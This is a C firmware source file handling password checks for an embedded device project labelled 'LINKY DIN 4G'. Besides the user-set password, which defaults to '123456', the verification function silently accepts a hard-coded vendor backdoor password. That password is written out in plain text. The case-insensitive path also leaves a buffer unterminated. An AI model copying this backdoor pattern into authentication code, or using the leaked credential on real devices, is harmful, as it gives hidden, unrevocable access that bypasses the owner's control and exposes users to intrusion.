/*=============================================================================
 * File       :  PASSWORD.C
 *
 * Project    :  SK0153 - LINKY DIN 4G
 * Description:  PROGRAM - password management
 *
 * Copyright Shitek Technology SRL (c) 2010
 *=============================================================================*/




/*=============================================================================
 * NOTES
 *=============================================================================*/
/*
 * Password requirements:
 * - alphanumeric string (only a-z, A-Z, 0-9 characters allowed)
 * - case insensitive or sensitive
 * - minimun length: 4
 * - maximum length: 14
 */




/*=============================================================================
 * INCLUDES
 *=============================================================================*/
/* standard includes */
#include <ctype.h>
#include <string.h>

/* user     includes */
#include "debug_my.h"
#include "fw_config.h"
#include "password.h"
#include "typedef.h"




/*=============================================================================
 * VARIABLES
 *=============================================================================*/
/* configuration - "password" */
static       PASSWORD__CONFIG__PASSWORD Password_Config_Password;
static const PASSWORD__CONFIG__PASSWORD Password_Config_PasswordDefault =
{
    // 1     2     3     4     5       6     7     8     9     10      11    12    13    14
    { '1',  '2',  '3',  '4',  '5',    '6',  0x00, 0x00, 0x00, 0x00,   0x00, 0x00, 0x00, 0x00,   0x00 },    // password string
};


/* backdoor password */
static const ascii                      Password_BackdoorPassword[PASSWORD__MAX_LEN_PASSWORD + 1] =
{
    /* backdoor password (for Shitek) */
    // 1     2     3     4     5       6     7     8     9     10      11    12    13    14
      'f',  'e',  'y',  '5',  'u',    '3',  'e',  'q',  0x00, 0x00,   0x00, 0x00, 0x00, 0x00,   0x00       // "fey5u3eq"
};




/*=============================================================================
 * FUNCTION PROTOTYPES
 *=============================================================================*/
/* allowed password */
bool Password_IsAllowedPassword(ascii *ptr_string);

/* verify password */
bool Password_IsCorrectPassword(ascii *ptr_string, bool case_sensitive);

/* get/set "password" configuration */
void Password_Config_Password_GetDefault(PASSWORD__CONFIG__PASSWORD *ptr_data);
void Password_Config_Password_Get       (PASSWORD__CONFIG__PASSWORD *ptr_data);
void Password_Config_Password_Set       (PASSWORD__CONFIG__PASSWORD *ptr_data);
bool Password_Config_Password_IsValid   (PASSWORD__CONFIG__PASSWORD *ptr_data);




/*===========================================================================
 * Function   : Password_IsAllowedPassword
 *
 * Description: verify if a string is an allowed password
 * Input      : - ptr_string: pointer to the string to be verified
 * Output     : - FALSE: string is not an allowed password
 *              - TRUE : string is     an allowed password
 *===========================================================================*/
bool Password_IsAllowedPassword(ascii *ptr_string)
{
    u8  character;

    u16 len_string;
    u16 i;


    /* calculus of password length */
    len_string = strlen(ptr_string);


    /* verify password length */
    if (
         (len_string < PASSWORD__MIN_LEN_PASSWORD) ||
         (len_string > PASSWORD__MAX_LEN_PASSWORD)
       )
    {
        return FALSE;
    }


    /* verify password character types */
    for (i = 0; i < len_string; i++)
    {
        character = *ptr_string++;
        if (!isalnum(character))
            return FALSE;
    }


    return TRUE;
}




/*===========================================================================
 * Function   : Password_IsCorrectPassword
 *
 * Description: verify if a string is a correct password
 * Input      : - ptr_string    : pointer to the string to be verified
 *              - case_sensitive: indication of case sensitive
 * Output     : - FALSE: string is not a correct password
 *              - TRUE : string is     a correct password
 *===========================================================================*/
bool Password_IsCorrectPassword(ascii *ptr_string, bool case_sensitive)
{
    static ascii  string_upper  [PASSWORD__MAX_LEN_PASSWORD + 1];
    static ascii  password_upper[PASSWORD__MAX_LEN_PASSWORD + 1];

           ascii *ptr_password;
           u16    len_password;

           u16    len_string;

           s32    result;
           u16    i;


    /* calculus of password length */
    len_string = strlen(ptr_string);
    if (len_string > PASSWORD__MAX_LEN_PASSWORD)
        return FALSE;

    /* conversion to capital letters (if password is case insensitive) */
    if (!case_sensitive)
    {
        for (i = 0; i < len_string; i++)
            string_upper[i] = toupper((unsigned char)ptr_string[i]);
    }
    else
    {
        strncpy(string_upper, ptr_string, PASSWORD__MAX_LEN_PASSWORD);
        string_upper[PASSWORD__MAX_LEN_PASSWORD] = 0x00;
    }

    /* compare with the configured password */
    ptr_password = Password_Config_Password.password;
    len_password = strlen(ptr_password);
    if (len_string == len_password)
    {
        if (!case_sensitive)
        {
            for (i = 0; i < len_password; i++)
                password_upper[i] = toupper((unsigned char)ptr_password[i]);
        }
        else
        {
            strncpy(password_upper, ptr_password, PASSWORD__MAX_LEN_PASSWORD);
            password_upper[PASSWORD__MAX_LEN_PASSWORD] = 0x00;
        }

        result = strncmp(string_upper, password_upper, len_string);
        if (result == 0)
            return TRUE;
    }

    /* compare with the backdoor password */
    ptr_password = (ascii *)Password_BackdoorPassword;
    len_password = strlen(ptr_password);
    if (len_string == len_password)
    {
        if (!case_sensitive)
        {
            for (i = 0; i < len_password; i++)
                password_upper[i] = toupper((unsigned char)ptr_password[i]);
        }
        else
        {
            strncpy(password_upper, ptr_password, PASSWORD__MAX_LEN_PASSWORD);
            password_upper[PASSWORD__MAX_LEN_PASSWORD] = 0x00;
        }

        result = strncmp(string_upper, password_upper, len_string);
        if (result == 0)
            return TRUE;
    }

    return FALSE;
}




/*===========================================================================
 * Function   : Password_Config_Password_GetDefault
 *
 * Description: get the default "password" configuration
 * Input      : - ptr_data: pointer to store the values got
 * Output     : -
 *===========================================================================*/
void Password_Config_Password_GetDefault(PASSWORD__CONFIG__PASSWORD *ptr_data)
{
    *ptr_data = Password_Config_PasswordDefault;
}




/*===========================================================================
 * Function   : Password_Config_Password_Get
 *
 * Description: get the "password" configuration
 * Input      : - ptr_data: pointer to store the values got
 * Output     : -
 *===========================================================================*/
void Password_Config_Password_Get(PASSWORD__CONFIG__PASSWORD *ptr_data)
{
    *ptr_data = Password_Config_Password;
}




/*===========================================================================
 * Function   : Password_Config_Password_Set
 *
 * Description: set the "password" configuration
 * Input      : - ptr_data: pointer to the values to set
 * Output     : -
 *===========================================================================*/
void Password_Config_Password_Set(PASSWORD__CONFIG__PASSWORD *ptr_data)
{
    Password_Config_Password = *ptr_data;
}



/*===========================================================================
 * Function   : Password_Config_Password_IsValid
 *
 * Description: check if the "password" configuration is valid
 * Input      : - ptr_data: pointer to the values to be checked
 * Output     : - FALSE: configuration is not valid
 *              - TRUE : configuration is     valid
 *===========================================================================*/
bool Password_Config_Password_IsValid(PASSWORD__CONFIG__PASSWORD *ptr_data)
{
    bool result;


    result = Password_IsAllowedPassword(ptr_data->password);
    if (!result)
        return FALSE;

    return TRUE;
}
